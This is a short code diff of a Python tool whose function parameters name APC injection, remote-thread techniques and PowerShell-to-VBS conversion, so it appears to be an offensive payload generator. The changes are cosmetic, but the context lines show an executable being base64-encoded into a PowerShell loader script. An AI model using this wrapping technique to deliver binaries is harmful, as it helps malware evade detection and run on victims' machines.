@@ -228,15 +228,10 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                     csharp_exe_path = ReadFilePath("exe")
                     # 输出的 PowerShell 脚本路径
                     output_ps1_path = 'output_script.ps1'
-
                     # 读取 C# 可执行文件的二进制内容
                     with open(csharp_exe_path, 'rb') as exe_file:
                         exe_bytes = exe_file.read()
-
-                    # 将二进制内容转换为 Base64 编码字符串
                     exe_base64 = base64.b64encode(exe_bytes).decode()
-
-                    # 创建 PowerShell 脚本的内容
                     ps_script = f'''
                     $exeBytesBase64 = "{exe_base64}"
                     $exeBytes = [System.Convert]::FromBase64String($exeBytesBase64)
@@ -248,7 +243,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                     with open(output_ps1_path, 'w') as ps1_file:
                         ps1_file.write(ps_script)
 
-                    print(f"PowerShell script has been generated: {output_ps1_path}")
+                    print(randomcolor()+ f"PowerShell script has been generated: {output_ps1_path}")
                   
                     
                 if formatopions == "back" or formatopions == "BACK" or formatopions == None:
@@ -313,8 +308,6 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
         if Options == "4":
                 print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK)
                 print(Resource.StringPainting.DynamicPainting.DynaminString())
-
-
                 my_filetypes = [('all files', '.*'), ('text files', '.txt')]
                 answer = filedialog.askopenfilename(initialdir=os.getcwd(), title="请选择一个文件:", filetypes=my_filetypes) 
                 if answer:
